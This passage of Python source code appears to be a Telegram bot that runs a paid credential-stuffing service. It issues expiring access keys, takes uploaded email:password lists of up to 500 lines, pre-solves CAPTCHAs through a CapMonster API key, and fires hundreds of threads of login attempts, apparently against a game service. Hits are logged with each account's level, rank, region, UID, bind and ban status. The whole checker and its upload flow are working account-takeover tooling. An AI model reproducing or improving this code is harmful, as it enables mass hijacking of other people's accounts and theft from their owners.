                        bind_info = self.get_bind_info(jwt_token, session)
                    except:
                        bind_info = "N/A"

                account_info["bind_info"] = bind_info

                if ban_status.get("is_banned", False):
                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
                else:
                    return {"status": "valid", "info": account_info}

            elif "wrong" in message.lower() or "incorrect" in message.lower():
                return {"status": "invalid", "reason": "Wrong credentials"}
            elif "blocked" in message.lower() or "banned" in message.lower():
                return {"status": "invalid", "reason": "Account blocked"}
            else:
                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}

        except requests.exceptions.Timeout:
            return {"status": "invalid", "reason": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "invalid", "reason": "Connection error"}
        except Exception as e:
            return {"status": "invalid", "reason": f"Error: {str(e)[:30]}"}
        finally:
            if session:
                try:
                    session.close()
                except:
                    pass

class TelegramBot:
    """Telegram bot handler with admin controls and user management."""

    def __init__(self, token: str, admin_ids: list):
        self.token = token
        self.admin_ids = set(admin_ids)
        self.key_manager = KeyManager()
        self.data_manager = DataManager()
        self.capmonster_manager = CapMonsterManager()
        self.application = None
        self.user_last_upload = {}  # Track last upload time per user
        self.user_last_check = {}   # Track last /check command time per user
        self.web_app = None
        self.web_runner = None

    async def setup_web_server(self):
        """Set up a simple web server for health checks."""
        async def health_check(request):
            return web.json_response({
                "status": "ok",
                "service": "telegram-bot",
                "timestamp": datetime.now().isoformat()
            })

        async def root_handler(request):
            return web.json_response({
                "message": "Telegram Bot is running",
                "status": "active",
                "timestamp": datetime.now().isoformat()
            })

        self.web_app = web.Application()
        self.web_app.router.add_get('/', root_handler)
        self.web_app.router.add_get('/health', health_check)

        # Start web server
        self.web_runner = web_runner.AppRunner(self.web_app)
        await self.web_runner.setup()
        site = web_runner.TCPSite(self.web_runner, '0.0.0.0', 5000)
        await site.start()
        logger.info("Web server started on port 5000")

    async def start(self):
        """Start the bot and set up handlers."""
        # Start web server first
        await self.setup_web_server()

        # Build application
        self.application = Application.builder().token(self.token).build()

        # Add command handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("mykey", self.my_key_command))
        self.application.add_handler(CommandHandler("redeem", self.redeem_command))

        # CapMonster and checking commands
        self.application.add_handler(CommandHandler("apikey", self.set_api_key_command))
        self.application.add_handler(CommandHandler("balance", self.balance_command))
        self.application.add_handler(CommandHandler("check", self.check_command))

        # Admin-only commands
        self.application.add_handler(CommandHandler("generatekey", self.generate_key_command))
        self.application.add_handler(CommandHandler("listkeys", self.list_keys_command))
        self.application.add_handler(CommandHandler("revokekey", self.revoke_key_command))
        self.application.add_handler(CommandHandler("announce", self.announce_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))

        # Message handler for regular messages and file uploads
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))

        # Start the bot first
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()

        logger.info("Bot is running...")

        # Set up bot commands and menu (optional, non-blocking)
        asyncio.create_task(self.setup_bot_commands())

        # Keep the bot running
        try:
            await asyncio.Future()  # Run forever
        except KeyboardInterrupt:
            logger.info("Shutting down bot...")
        finally:
            await self.application.stop()
            if self.web_runner:
                await self.web_runner.cleanup()

    async def setup_bot_commands(self):
        """Set up bot commands and persistent menu."""
        try:
            # Wait a bit for the bot to be fully initialized
            await asyncio.sleep(2)

            # Define commands for the menu
            commands = [
                BotCommand("start", "Start the bot and get welcome message"),
                BotCommand("help", "Show help information"),
                BotCommand("mykey", "Check your key status and expiration"),
                BotCommand("redeem", "Redeem an access key"),
                BotCommand("apikey", "Set your CapMonster API key"),
                BotCommand("balance", "Check your CapMonster balance"),
                BotCommand("check", "Start account checking process"),
                BotCommand("generatekey", "Generate new access key (Admin only)"),
                BotCommand("listkeys", "List all active keys (Admin only)"),
                BotCommand("revokekey", "Revoke an access key (Admin only)"),
                BotCommand("announce", "Send announcement to all users (Admin only)"),
                BotCommand("stats", "Show bot statistics (Admin only)"),
            ]

            # Set commands for the bot with timeout handling
            try:
                await asyncio.wait_for(
                    self.application.bot.set_my_commands(commands),
                    timeout=10.0
                )

                # Set persistent menu button
                menu_button = MenuButtonCommands()
                await asyncio.wait_for(
                    self.application.bot.set_chat_menu_button(menu_button=menu_button),
                    timeout=10.0
                )

                logger.info("Bot commands and menu set up successfully")

            except asyncio.TimeoutError:
                logger.warning("Timeout setting up bot commands - bot will work without menu")

        except TelegramError as e:
            logger.warning(f"Could not set up bot commands (bot will still work): {e}")
        except Exception as e:
            logger.warning(f"Unexpected error setting up commands (bot will still work): {e}")

    def is_admin(self, user_id: int) -> bool:
        """Check if user is an admin."""
        return user_id in self.admin_ids

    def has_valid_key(self, user_id: int) -> bool:
        """Check if user has a valid key."""
        return self.is_admin(user_id) or self.key_manager.is_key_valid(user_id)

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command."""
        user = update.effective_user
        user_id = user.id

        # Track user
        self.data_manager.add_user(user_id, user.username, user.first_name)

        welcome_msg = f"👋 Welcome to the Access Control Bot, {user.first_name}!\n\n"

        if self.is_admin(user_id):
            welcome_msg += (
                "🔑 You have admin access to this bot.\n\n"
                "📋 Available Commands:\n"
                "• /generatekey - Generate access keys\n"
                "• /listkeys - View all active keys\n"
                "• /revokekey - Revoke access keys\n"
                "• /announce - Send announcements\n"
                "• /stats - View bot statistics\n"
                "• /mykey - Check your key status\n"
                "• /help - Show help information\n\n"
                "💡 Use the menu button (☰) to access commands quickly!"
            )
        elif self.has_valid_key(user_id):
            key_info = self.key_manager.get_key_info(user_id)
            expires_at = datetime.fromisoformat(key_info['expires_at'])
            days_remaining = (expires_at - datetime.now()).days

            welcome_msg += (
                f"✅ You have valid access to this bot.\n"
                f"⏰ Your key expires on: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📅 Days remaining: {days_remaining}\n\n"
                "📋 Available Commands:\n"
                "• /mykey - Check your key status\n"
                "• /help - Show help information\n\n"
                "💡 Use the menu button (☰) to access commands quickly!"
            )
        else:
            welcome_msg += (
                "❌ You don't have access to this bot.\n"
                "🔑 Please contact an administrator to get an access key.\n\n"
                "Once you have a key, you can use /redeem <key> to activate it."
            )

        await update.message.reply_text(welcome_msg)

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command."""
        user_id = update.effective_user.id

        help_msg = "🤖 **Bot Help**\n\n"

        if self.is_admin(user_id):
            help_msg += (
                "👑 **Admin Commands:**\n"
                "• `/generatekey <days>` - Generate key (1, 3, or 7 days)\n"
                "• `/listkeys` - List all active keys\n"
                "• `/revokekey <user_id>` - Revoke a specific key\n"
                "• `/announce <message>` - Send message to all users\n"
                "• `/stats` - View bot statistics\n\n"
            )

        help_msg += (
            "👤 **User Commands:**\n"
            "• `/start` - Start the bot\n"
            "• `/redeem <key>` - Redeem an access key\n"
            "• `/mykey` - Check your key status\n"
            "• `/apikey <key>` - Set your CapMonster API key\n"
            "• `/balance` - Check your CapMonster balance\n"
            "• `/check` - Start account checking (upload .txt file)\n"
            "• `/help` - Show this help message\n\n"
            "💡 **Tips:**\n"
            "• Use the menu button (☰) for quick access to commands\n"
            "• Keys automatically expire after their set duration\n"
            "• Set your CapMonster API key before checking accounts\n"
            "• Contact admins if you need access or have issues"
        )

        await update.message.reply_text(help_msg, parse_mode='Markdown')

    async def my_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /mykey command to show key status."""
        user_id = update.effective_user.id

        if self.is_admin(user_id):
            await update.message.reply_text(
                "👑 **Admin Access**\n\n"
                "You have permanent admin access to this bot.\n"
                "⏰ Expiration: Never\n"
                "🔑 Status: Active (Admin)",
                parse_mode='Markdown'
            )
            return

        key_info = self.key_manager.get_key_info(user_id)

        if not key_info:
            await update.message.reply_text(
                "❌ **No Access Key**\n\n"
                "You don't have an active access key for this bot.\n"
                "🔑 Status: No Key\n"
                "💬 Contact an administrator to get access."
            )
            return

        expires_at = datetime.fromisoformat(key_info['expires_at'])
        now = datetime.now()

        if expires_at <= now:
            await update.message.reply_text(
                "⏰ **Key Expired**\n\n"
                f"Your access key expired on: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                "🔑 Status: Expired\n"
                "💬 Contact an administrator for a new key."
            )
            return

        time_remaining = expires_at - now
        days_remaining = time_remaining.days
        hours_remaining = time_remaining.seconds // 3600

        status_msg = (
            "✅ **Active Access Key**\n\n"
            f"🆔 Key ID: {key_info['key_id'][:8]}...\n"
            f"📅 Generated: {datetime.fromisoformat(key_info['created_at']).strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"⏰ Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"🔑 Status: Active\n\n"
            f"⏳ **Time Remaining:**\n"
        )

        if days_remaining > 0:
            status_msg += f"📅 {days_remaining} days, {hours_remaining} hours"
        elif hours_remaining > 0:
            status_msg += f"⏰ {hours_remaining} hours"
        else:
            minutes_remaining = time_remaining.seconds // 60
            status_msg += f"⏰ {minutes_remaining} minutes"

        await update.message.reply_text(status_msg, parse_mode='Markdown')

    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /redeem command to redeem an access key."""
        user_id = update.effective_user.id
        user = update.effective_user

        # Track user interaction
        self.data_manager.add_user(user_id, user.username, user.first_name)

        # Check if user provided a key
        if not context.args:
            await update.message.reply_text(
                "🔑 **Redeem Access Key**\n\n"
                "Please provide a key to redeem.\n\n"
                "**Usage:** `/redeem <key-id>`\n"
                "**Example:** `/redeem abc123def-456g-789h-012i-jklm345nop67`\n\n"
                "💬 Contact an administrator if you need a key.",
                parse_mode='Markdown'
            )
            return

        key_id = context.args[0].strip()

        # Check if user already has an active key and warn them
        if self.key_manager.is_key_valid(user_id):
            key_info = self.key_manager.get_key_info(user_id)
            expires_at = datetime.fromisoformat(key_info['expires_at'])

            await update.message.reply_text(
                "⚠️ **Key Already Active**\n\n"
                f"You already have an active access key.\n"
                f"⏰ Current key expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                "💡 Your current key will be replaced if you redeem a new one.\n"
                "Proceeding with key redemption...",
                parse_mode='Markdown'
            )

        # Try to activate the key
        try:
            success = self.key_manager.activate_key(key_id, user_id)

            if success:
                # Get the activated key info
                key_info = self.key_manager.get_key_info(user_id)
                expires_at = datetime.fromisoformat(key_info['expires_at'])
                days_duration = key_info.get('days_duration', 'Unknown')

                await update.message.reply_text(
                    "✅ **Key Successfully Redeemed!**\n\n"
                    f"🎉 Welcome {user.first_name}! Your access key has been activated.\n\n"
                    f"📋 **Key Details:**\n"
                    f"🆔 Key ID: {key_id[:8]}...\n"
                    f"⏰ Valid until: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"📅 Duration: {days_duration} days\n\n"
                    "🤖 You now have full access to the bot!\n"
                    "💡 Use `/help` to see available commands.",
                    parse_mode='Markdown'
                )

                logger.info(f"User {user_id} (@{user.username}) successfully redeemed key {key_id}")

            else:
                await update.message.reply_text(
                    "❌ **Invalid or Expired Key**\n\n"
                    "The key you provided is either:\n"
                    "• Invalid or doesn't exist\n"
                    "• Already been used by someone else\n"
                    "• Expired before activation\n\n"
                    "🔑 Please check the key and try again.\n"
                    "💬 Contact an administrator if you continue having issues.",
                    parse_mode='Markdown'
                )

                logger.warning(f"User {user_id} (@{user.username}) failed to redeem key {key_id}")

        except Exception as e:
            logger.error(f"Error redeeming key {key_id} for user {user_id}: {e}")
            await update.message.reply_text(
                "⚠️ **Redemption Error**\n\n"
                "An error occurred while processing your key.\n"
                "Please try again later or contact an administrator.\n\n"
                f"Error details: {str(e)[:100]}...",
                parse_mode='Markdown'
            )

    async def generate_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /generatekey command (admin only)."""
        user_id = update.effective_user.id

        if not self.is_admin(user_id):
            await update.message.reply_text("❌ This command is only available to administrators.")
            return

        # Parse duration argument
        if not context.args or len(context.args) != 1:
            await update.message.reply_text(
                "❌ **Invalid Usage**\n\n"
                "Usage: `/generatekey <days>`\n"
                "Available durations: 1, 3, or 7 days\n\n"
                "Example: `/generatekey 7`",
                parse_mode='Markdown'
            )
            return

        try:
            days = int(context.args[0])
            if days not in [1, 3, 7]:
                raise ValueError("Invalid duration")
        except ValueError:
            await update.message.reply_text(
                "❌ **Invalid Duration**\n\n"
                "Please specify 1, 3, or 7 days.\n"
                "Example: `/generatekey 3`",
                parse_mode='Markdown'
            )
            return

        # Generate the key
        key_id, expires_at = self.key_manager.generate_key(days)

        success_msg = (
            "✅ **Access Key Generated**\n\n"
            f"🆔 Key ID: `{key_id}`\n"
            f"⏰ Duration: {days} days\n"
            f"📅 Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "📋 **Instructions:**\n"
            "1. Share this key ID with the user\n"
            "2. User should use `/redeem <key>` to activate access\n"
            "3. Key will automatically expire after the set duration"
        )

        await update.message.reply_text(success_msg, parse_mode='Markdown')
        logger.info(f"Admin {user_id} generated key {key_id} for {days} days")

    async def list_keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /listkeys command (admin only)."""
        user_id = update.effective_user.id

        if not self.is_admin(user_id):
            await update.message.reply_text("❌ This command is only available to administrators.")
            return

        keys = self.key_manager.get_all_keys()

        if not keys:
            await update.message.reply_text(
                "📋 **Active Keys**\n\n"
                "No active keys found."
            )
            return

        keys_msg = "📋 **Active Keys**\n\n"

        for key_data in keys:
            user_id_key = key_data.get('user_id')
            expires_at = datetime.fromisoformat(key_data['expires_at'])
            created_at = datetime.fromisoformat(key_data['created_at'])

            # Get user info if user_id exists
            if user_id_key:
                user_info = self.data_manager.get_user(user_id_key)
                user_display = f"@{user_info['username']}" if user_info and user_info['username'] else f"ID: {user_id_key}"
            else:
                user_display = "Not activated"

            time_remaining = expires_at - datetime.now()
            days_remaining = max(0, time_remaining.days)

            status = "✅ Active" if expires_at > datetime.now() else "❌ Expired"
            if key_data.get('status') == 'pending':
                status = "⏳ Pending"

            keys_msg += (
                f"👤 {user_display}\n"
                f"🆔 Key: {key_data['key_id'][:8]}...\n"
                f"📅 Created: {created_at.strftime('%m/%d %H:%M')}\n"
                f"⏰ Expires: {expires_at.strftime('%m/%d %H:%M')}\n"
                f"🔑 Status: {status}\n"
                f"📊 Days left: {days_remaining}\n\n"
            )

        await update.message.reply_text(keys_msg)

    async def revoke_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /revokekey command (admin only)."""
        user_id = update.effective_user.id

        if not self.is_admin(user_id):
            await update.message.reply_text("❌ This command is only available to administrators.")
            return

        if not context.args or len(context.args) != 1:
            await update.message.reply_text(
                "❌ **Invalid Usage**\n\n"
                "Usage: `/revokekey <user_id>`\n"
                "Example: `/revokekey 123456789`",
                parse_mode='Markdown'
            )
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")
            return

        if self.key_manager.revoke_key(target_user_id):
            user_info = self.data_manager.get_user(target_user_id)
            user_display = f"@{user_info['username']}" if user_info and user_info['username'] else f"ID: {target_user_id}"

            await update.message.reply_text(
                f"✅ **Key Revoked**\n\n"
                f"Successfully revoked access key for {user_display}"
            )
            logger.info(f"Admin {user_id} revoked key for user {target_user_id}")
        else:
            await update.message.reply_text(
                f"❌ **Key Not Found**\n\n"
                f"No active key found for user ID: {target_user_id}"
            )

    async def announce_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /announce command (admin only)."""
        user_id = update.effective_user.id

        if not self.is_admin(user_id):
            await update.message.reply_text("❌ This command is only available to administrators.")
            return

        if not context.args:
            await update.message.reply_text(
                "❌ **Invalid Usage**\n\n"
                "Usage: `/announce <message>`\n"
                "Example: `/announce Server maintenance in 1 hour`",
                parse_mode='Markdown'
            )
            return

        message = ' '.join(context.args)
        announcement = f"📢 **Announcement**\n\n{message}"

        # Get all users
        users = self.data_manager.get_all_users()
        success_count = 0
        failed_count = 0

        await update.message.reply_text(
            f"📤 **Broadcasting Announcement**\n\n"
            f"Sending to {len(users)} users...\n"
            f"This may take a moment."
        )

        for user_data in users:
            try:
                await self.application.bot.send_message(
                    chat_id=user_data['user_id'],
                    text=announcement,
                    parse_mode='Markdown'
                )
                success_count += 1
                # Rate limiting to avoid hitting Telegram limits
                await asyncio.sleep(0.1)

            except TelegramError as e:
                logger.warning(f"Failed to send announcement to user {user_data['user_id']}: {e}")
                failed_count += 1

        result_msg = (
            f"✅ **Broadcast Complete**\n\n"
            f"📊 Successfully sent: {success_count}\n"
            f"❌ Failed to send: {failed_count}\n"
            f"📈 Total users: {len(users)}"
        )

        await update.message.reply_text(result_msg, parse_mode='Markdown')
        logger.info(f"Admin {user_id} sent announcement to {success_count}/{len(users)} users")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command (admin only)."""
        user_id = update.effective_user.id

        if not self.is_admin(user_id):
            await update.message.reply_text("❌ This command is only available to administrators.")
            return

        # Get statistics
        all_users = self.data_manager.get_all_users()
        all_keys = self.key_manager.get_all_keys()
        active_keys = [k for k in all_keys if datetime.fromisoformat(k['expires_at']) > datetime.now()]
        expired_keys = [k for k in all_keys if datetime.fromisoformat(k['expires_at']) <= datetime.now()]

        stats_msg = (
            "📊 **Bot Statistics**\n\n"
            f"👥 Total Users: {len(all_users)}\n"
            f"🔑 Total Keys Generated: {len(all_keys)}\n"
            f"✅ Active Keys: {len(active_keys)}\n"
            f"❌ Expired Keys: {len(expired_keys)}\n"
            f"👑 Admins: {len(self.admin_ids)}\n\n"
            f"📅 **Key Breakdown:**\n"
        )

        # Count keys by expiration
        expiring_soon = [k for k in active_keys if (datetime.fromisoformat(k['expires_at']) - datetime.now()).days <= 1]
        expiring_week = [k for k in active_keys if 1 < (datetime.fromisoformat(k['expires_at']) - datetime.now()).days <= 7]

        stats_msg += (
            f"⚠️ Expiring in 24h: {len(expiring_soon)}\n"
            f"📅 Expiring in 7 days: {len(expiring_week)}\n"
        )

        await update.message.reply_text(stats_msg, parse_mode='Markdown')

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle regular text messages."""
        user_id = update.effective_user.id

        if not self.has_valid_key(user_id):
            await update.message.reply_text(
                "❌ **Access Denied**\n\n"
                "You don't have valid access to this bot.\n"
                "🔑 Please contact an administrator to get an access key.\n\n"
                "💡 Use /start to check your access status."
            )
            return

        # Echo the message for users with valid access
        await update.message.reply_text(
            f"✅ Message received: {update.message.text}\n\n"
            f"You have valid access to this bot. Use /help for available commands."
        )

    async def set_api_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /apikey command to set CapMonster API key."""
        user_id = update.effective_user.id

        if not self.has_valid_key(user_id):
            await update.message.reply_text(
                "❌ **Access Denied**\n\n"
                "You need valid access to use this command.\n"
                "🔑 Please contact an administrator to get an access key.",
                parse_mode='Markdown'
            )
            return

        if not context.args or len(context.args) != 1:
            await update.message.reply_text(
                "❌ **Invalid Usage**\n\n"
                "Usage: `/apikey <your_capmonster_api_key>`\n"
                "Example: `/apikey abc123def456ghi789`\n\n"
                "💡 Get your API key from CapMonster.cloud",
                parse_mode='Markdown'
            )
            return

        api_key = context.args[0].strip()

        # Validate the API key by checking balance
        try:
            response = requests.post('https://api.capmonster.cloud/getBalance', 
                                   json={"clientKey": api_key}, 
                                   timeout=10)
            data = response.json()

            if data.get('errorId') == 0:
                balance = data.get('balance', 0)
                self.capmonster_manager.set_api_key(user_id, api_key)

                await update.message.reply_text(
                    f"✅ **API Key Set Successfully**\n\n"
                    f"💰 Current Balance: ${balance:.3f}\n"
                    f"🔑 API Key: {api_key[:8]}...\n\n"
                    f"You can now use `/check` to start checking accounts!",
                    parse_mode='Markdown'
                )
                logger.info(f"User {user_id} set CapMonster API key")
            else:
                await update.message.reply_text(
                    f"❌ **Invalid API Key**\n\n"
                    f"Error: {data.get('errorDescription', 'Unknown error')}\n"
                    f"Please check your API key and try again.",
                    parse_mode='Markdown'
                )
        except Exception as e:
            await update.message.reply_text(
                f"⚠️ **Validation Error**\n\n"
                f"Could not validate your API key: {str(e)}\n"
                f"Please try again later.",
                parse_mode='Markdown'
            )
            return

    async def balance_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /balance command to check CapMonster balance."""
        user_id = update.effective_user.id

        if not self.has_valid_key(user_id):
            await update.message.reply_text(
                "❌ **Access Denied**\n\n"
                "You need valid access to use this command.\n"
                "🔑 Please contact an administrator to get an access key.",
                parse_mode='Markdown'
            )
            return

        balance = self.capmonster_manager.get_balance(user_id)

        if balance is None:
            api_key = self.capmonster_manager.get_api_key(user_id)
            if not api_key:
                await update.message.reply_text(
                    "❌ **No API Key Set**\n\n"
                    "Please set your CapMonster API key first.\n"
                    "Use: `/apikey <your_api_key>`",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "⚠️ **Balance Check Failed**\n\n"
                    "Could not retrieve your balance. Please check:\n"
                    "• Your API key is valid\n"
                    "• CapMonster service is available\n"
                    "• Your internet connection",
                    parse_mode='Markdown'
                )
            return

        await update.message.reply_text(
            f"💰 **CapMonster Balance**\n\n"
            f"Current Balance: ${balance:.3f}\n"
            f"Account Status: Active ✅\n\n"
            f"💡 You can use `/check` to start checking accounts!",
            parse_mode='Markdown'
        )

    async def check_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /check command to start account checking process."""
        user_id = update.effective_user.id

        if not self.has_valid_key(user_id):
            await update.message.reply_text(
                "❌ **Access Denied**\n\n"
                "You need valid access to use this command.\n"
                "🔑 Please contact an administrator to get an access key.",
                parse_mode='Markdown'
            )
            return

        # Check /check command cooldown (3 minutes)
        now = datetime.now()
        if user_id in self.user_last_check:
            time_since_last = now - self.user_last_check[user_id]
            if time_since_last.total_seconds() < 180:  # 3 minutes = 180 seconds
                remaining = 180 - time_since_last.total_seconds()
                minutes = int(remaining // 60)
                seconds = int(remaining % 60)
                await update.message.reply_text(
                    f"⏳ **Check Command Cooldown Active**\n\n"
                    f"Please wait {minutes}m {seconds}s before using `/check` again.\n"
                    f"This prevents system overload.",
                    parse_mode='Markdown'
                )
                return

        # Check if user has CapMonster API key
        api_key = self.capmonster_manager.get_api_key(user_id)
        if not api_key:
            await update.message.reply_text(
                "❌ **No API Key Set**\n\n"
                "Please set your CapMonster API key first.\n"
                "Use: `/apikey <your_api_key>`\n\n"
                "💡 Get your API key from CapMonster.cloud",
                parse_mode='Markdown'
            )
            return

        # Check balance
        balance = self.capmonster_manager.get_balance(user_id)
        if balance is None or balance <= 0:
            await update.message.reply_text(
                "⚠️ **Insufficient Balance**\n\n"
                "Your CapMonster balance is too low or could not be checked.\n"
                "Please add funds to your CapMonster account.\n\n"
                f"Current Balance: ${balance if balance else 'Unknown'}",
                parse_mode='Markdown'
            )
            return

        await update.message.reply_text(
            "📁 **Account Checking**\n\n"
            "Please upload a .txt file containing accounts in the format:\n"
            "`email:password` (one per line)\n\n"
            "📊 **Limits:**\n"
            "• Maximum: 500 accounts per file\n"
            "• File format: .txt only\n"
            "• Optimized processing for speed and stability\n\n"
            f"💰 Your balance: ${balance:.3f}\n\n"
            "📤 Upload your file now...",
            parse_mode='Markdown'
        )

        # Update last /check command time
        self.user_last_check[user_id] = now

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document uploads for account checking."""
        user_id = update.effective_user.id

        if not self.has_valid_key(user_id):
            await update.message.reply_text("❌ You need valid access to upload files.")
            return

        # Check upload cooldown (3 minutes)
        now = datetime.now()
        if user_id in self.user_last_upload:
            time_since_last = now - self.user_last_upload[user_id]
            if time_since_last.total_seconds() < 180:  # 3 minutes = 180 seconds
                remaining = 180 - time_since_last.total_seconds()
                minutes = int(remaining // 60)
                seconds = int(remaining % 60)
                await update.message.reply_text(
                    f"⏳ **Upload Cooldown Active**\n\n"
                    f"Please wait {minutes}m {seconds}s before uploading another file.\n"
                    f"This prevents system overload.",
                    parse_mode='Markdown'
                )
                return

        # Check if user has CapMonster API key
        api_key = self.capmonster_manager.get_api_key(user_id)
        if not api_key:
            await update.message.reply_text(
                "❌ Please set your CapMonster API key first using `/apikey <key>`"
            )
            return

        document = update.message.document

        # Check file type
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text(
                "❌ **Invalid File Type**\n\n"
                "Please upload a .txt file only.",
                parse_mode='Markdown'
            )
            return

        # Check file size (max 1MB for safety)
        if document.file_size > 1024 * 1024:
            await update.message.reply_text(
                "❌ **File Too Large**\n\n"
                "Please upload a file smaller than 1MB.",
                parse_mode='Markdown'
            )
            return

        try:
            # Download file
            file = await context.bot.get_file(document.file_id)
            file_content = await file.download_as_bytearray()

            # Parse accounts
            content = file_content.decode('utf-8')
            lines = [line.strip() for line in content.split('\n') if line.strip()]

            accounts = []
            for line in lines:
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        accounts.append((parts[0].strip(), parts[1].strip()))

            if len(accounts) == 0:
                await update.message.reply_text(
                    "❌ **No Valid Accounts Found**\n\n"
                    "Please ensure your file contains accounts in the format:\n"
                    "`email:password` (one per line)",
                    parse_mode='Markdown'
                )
                return

            if len(accounts) > 500:
                await update.message.reply_text(
                    f"❌ **Too Many Accounts**\n\n"
                    f"Found {len(accounts)} accounts, but the limit is 500.\n"
                    f"Please reduce your list and try again.",
                    parse_mode='Markdown'
                )
                return

            # Update last upload time
            self.user_last_upload[user_id] = now

            # Start checking process
            await self.process_accounts(update, context, accounts, api_key)

        except Exception as e:
            logger.error(f"Error processing file upload: {e}")
            await update.message.reply_text(
                f"⚠️ **File Processing Error**\n\n"
                f"Could not process your file: {str(e)}\n"
                f"Please try again with a different file.",
                parse_mode='Markdown'
            )

    
    async def process_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE, accounts: List[Tuple[str, str]], api_key: str):
        """Process accounts using ultra-fast batch processing with pre-solved CAPTCHAs."""
        user_id = update.effective_user.id

        # Ultra-aggressive threading for maximum speed
        if len(accounts) <= 20:
            optimal_threads = 150
            estimated_time = "5-10 seconds"
        elif len(accounts) <= 50:
            optimal_threads = 200
            estimated_time = "10-20 seconds"
        elif len(accounts) <= 100:
            optimal_threads = 300
            estimated_time = "20-35 seconds"
        elif len(accounts) <= 200:
            optimal_threads = 400
            estimated_time = "35-60 seconds"
        else:
            optimal_threads = 500
            estimated_time = f"{max(1, len(accounts) // 60)}-{max(2, len(accounts) // 40)} minutes"

        start_msg = await update.message.reply_text(
            f"🚀 **Ultra-Fast Processing Started**\n\n"
            f"📊 Total accounts: {len(accounts)}\n"
            f"⚙️ Max threads: {optimal_threads}\n"
            f"⏱️ Estimated time: {estimated_time}\n\n"
            f"⚡ Pre-solving CAPTCHAs for maximum speed...",
            parse_mode='Markdown'
        )

        # Initialize checker
        checker = AccountChecker(api_key)

        # Pre-solve multiple CAPTCHAs in parallel for ultra-fast processing
        captcha_tokens = []
        captcha_lock = threading.Lock()

        def solve_captcha_batch():
            try:
                token = checker.solve_cn31(max_retries=1)  # Single retry for speed
                if token:
                    with captcha_lock:
                        captcha_tokens.append(token)
            except:
                pass  # Ignore failed CAPTCHA solves

        # Pre-solve CAPTCHAs (aim for 1 CAPTCHA per 3-5 accounts)
        captcha_count = max(5, min(20, len(accounts) // 4))

        with ThreadPoolExecutor(max_workers=captcha_count, thread_name_prefix="CaptchaSolver") as captcha_executor:
            captcha_futures = [captcha_executor.submit(solve_captcha_batch) for _ in range(captcha_count)]

            # Wait briefly for initial CAPTCHAs
            time.sleep(2)

            # Cancel remaining CAPTCHA solving to start processing
            for future in captcha_futures:
                if not future.done():
                    future.cancel()

        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=start_msg.message_id,
            text=f"⚡ **Processing {len(accounts)} accounts with {len(captcha_tokens)} pre-solved CAPTCHAs...**",
            parse_mode='Markdown'
        )

        # Thread-safe results tracking
        valid_accounts = []
        invalid_accounts = []
        banned_accounts = []
        processed = 0
        start_time = time.time()
        results_lock = threading.Lock()
        captcha_index = 0

        def get_next_captcha():
            nonlocal captcha_index
            with captcha_lock:
                if captcha_index < len(captcha_tokens):
                    token = captcha_tokens[captcha_index]
                    captcha_index += 1
                    return token
                return None

        def check_account_ultra_fast(account_data):
            nonlocal processed
            email, password = account_data

            try:
                # Try with pre-solved CAPTCHA first
                existing_token = get_next_captcha()
                if existing_token:
                    result = checker.check_account_with_token(email, password, existing_token)
                else:
                    # Fallback to solving CAPTCHA (single attempt only)
                    result = checker.check_account_simple_fast(email, password)

                with results_lock:
                    if result["status"] == "valid":
                        info = result["info"]
                        valid_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: False"
                        valid_accounts.append(valid_line)
                    elif result["status"] == "banned":
                        info = result["info"]
                        ban_info = result.get("ban_info", [{}])[0] if result.get("ban_info") else {}
                        ban_reason = ban_info.get("reason", "Unknown")
                        banned_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: {ban_reason}"
                        banned_accounts.append(banned_line)
                    else:
                        invalid_accounts.append(f"{email}:{password}")

                    processed += 1

            except Exception as e:
                with results_lock:
                    invalid_accounts.append(f"{email}:{password}")
                    processed += 1

